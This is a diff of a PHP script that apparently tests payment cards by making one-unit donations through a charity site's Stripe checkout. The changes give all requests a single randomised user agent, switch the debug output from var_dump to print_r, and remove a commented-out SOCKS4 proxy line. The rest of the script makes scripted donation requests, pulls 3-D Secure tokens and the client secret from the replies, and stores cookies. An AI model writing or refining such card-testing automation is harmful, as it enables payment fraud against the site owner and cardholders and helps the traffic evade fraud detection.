@@ -7,6 +7,8 @@ set_time_limit(0);
 // date_default_timezone_set('Asia/Jakarta');
 
 //frist Step 
+
+$user_agent = random_ua();
 function getSID(){
   $url = 'https://graasp.eu/donate';
   $post_items[] = "amount=1";
@@ -186,7 +188,6 @@ $sessionId = getSID();
 # -------------------- [1 REQ] -------------------#
 
 $ch = curl_init();
-// curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -203,7 +204,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+'user-agent: '.$user_agent,
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -246,7 +247,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: '.random_ua(),
+'user-agent: '.$user_agent,
    ));
 
 # ----------------- [2req Postfields] ---------------------#
@@ -258,7 +259,7 @@ $source = trim(strip_tags(getStr($result2,'"three_d_secure_2_source": "','"')));
 $client_secret = trim(strip_tags(getStr($result2,'"client_secret": "','"')));
 $id2 = getObj($result2,'payment_intent','id');
 
-var_dump($result2);
+print_r($result2);
 echo '++++++++++++++++++++++++++++++++++++++++++++++++';
 echo '<br> client_secret => <br>';
 echo $client_secret;
@@ -297,7 +298,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: '.random_ua(),
+'user-agent: '.$user_agent,
    ));
 
 # ----------------- [3req Postfields] ---------------------#
@@ -335,7 +336,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: '.random_ua(),
+'user-agent: '.$user_agent,
 ));
 
 # ----------------- [4req Postfields] ---------------------#
